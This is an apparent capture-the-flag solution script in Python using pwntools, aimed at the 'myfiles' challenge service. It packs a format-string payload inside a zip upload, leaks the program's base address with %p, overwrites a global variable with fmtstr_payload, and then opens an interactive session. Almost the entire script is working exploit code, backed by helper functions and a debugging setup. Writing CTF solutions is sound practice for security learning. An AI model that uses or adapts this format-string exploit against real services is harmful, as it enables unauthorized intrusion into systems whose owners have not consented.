#!/usr/bin/env python3
from pwn import *
from subprocess import run

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chal'
elf = context.binary = ELF(exe, checksec=True)
# libc = './libc.so.6'
# libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = 'myfiles.chal.irisc.tf', 10001

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg

# break *readZipInfo
# break *readZipInfo+466

# filename assignment loop
# breakrva 0x179b
# breakrva 0x17a5

# extrafield check
# breakrva 0x16fc

# printf format string
break *viewFile+429
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# └──╼ [★]$ pwn checksec chal 
#     Arch:     amd64-64-little
#     RELRO:    Full RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      PIE enabled

# https://stackoverflow.com/questions/7822956/how-to-convert-negative-integer-value-to-hex-in-python
def tohex(val, nbits):
  return hex((val + (1 << nbits)) % (1 << nbits))

def craft_payload(p) -> bytes:
    with open("payload", "wb") as f:
        f.write(p)
    run(["zip", "-X", "-0", "payload.zip", "payload"])
    return open("payload.zip", "rb").read().hex().encode()

def create_user(username, password):
    io.sendlineafter(b'>', b'3')
    io.sendlineafter(b'?', invite_code)
    io.sendlineafter(b'?', username)
    io.sendlineafter(b'?', password)

def upload_file(uid, content):
    io.sendlineafter(b'>', b'4')
    io.sendlineafter(b'?', str(uid).encode())
    io.sendlineafter(b'file', content)

def view_file(uid, password, fid):
    io.sendlineafter(b'>', b'5')
    io.sendlineafter(b'?', str(uid).encode())
    io.sendlineafter(b'?', password)
    io.sendlineafter(b'?', str(fid).encode())

invite_code = b'yelling-pixel-corals'  if args.REMOTE else b'terrible-red-busses'
def exploit():
    global io
    io = initialize()

    create_user(b'idk', b'idk')

    # offset-14
    # payload = craft_payload(b'AAAAAAAA|%14$p')

    payload = craft_payload(b'just so to be big: %p')
    upload_file(0, payload)
    view_file(0, b'idk', 0) 

    io.recvuntil(b'just so to be big: 0x')
    elf.address = int(io.recvline().strip(), 16) - 0x5081

    payload = craft_payload(fmtstr_payload(14, {elf.address+0x5050: 1}, write_size='short'))
    upload_file(0, payload)
    view_file(0, b'idk', 1)

    io.sendlineafter(b'>', b'6')
    io.sendlineafter(b'?', b'0')
    io.sendlineafter(b'?', b'idk')

    log.info("elf base: %#x", elf.address)
    io.interactive()
    
if __name__ == '__main__':
    exploit()